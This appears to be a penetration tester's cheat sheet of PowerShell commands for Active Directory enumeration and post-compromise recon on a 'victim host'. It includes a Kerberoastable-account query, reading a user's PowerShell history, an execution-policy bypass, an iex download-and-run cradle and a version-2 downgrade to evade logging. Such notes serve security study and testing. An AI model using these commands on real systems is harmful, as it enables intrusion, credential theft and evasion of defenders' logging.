> A powerful toolset for managing and automating tasks in an Active Directory environment. It provides a comprehensive set of cmdlets that enable administrators and security professionals to perform domain enumeration.


```powershell
# PowerShell Active Directory Module

Get-Module # List modules available for import
Import-Module ActiveDirectory # Import the AD module if not already present
Get-ADDomain # Get lots of information about the domain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # Get Kerberoastable users (Service Accounts)
Get-ADTrust -Filter * # Enumerate trust relationships within domain
	1. Do users in this domain have access to other domains?
	2. Can you find a trust that is overly permissive?
Get-ADGroup -Filter * | select name # List AD groups
Get-ADGroup -Identity <groupname> # Get detailed group info
Get-ADGroupMember -Identity <groupname> # Get group members
```

## General Powershell Recon:
```PowerShell
Get-ExecutionPolicy -List # Will print the execution policy

Set-ExecutionPolicy Bypass -Scope Process # This changes the execution policy just for the current session, not making and permanant changes to the victim host

Get-ChildItem Env: | ft Key,Value # Kind of like `set`

Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # Get the users PowerShell history

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" # Download a file!

```

### Are you able to lower the Powershell version (To evade logging?)
```PowerShell
powershell.exe -version 2
```
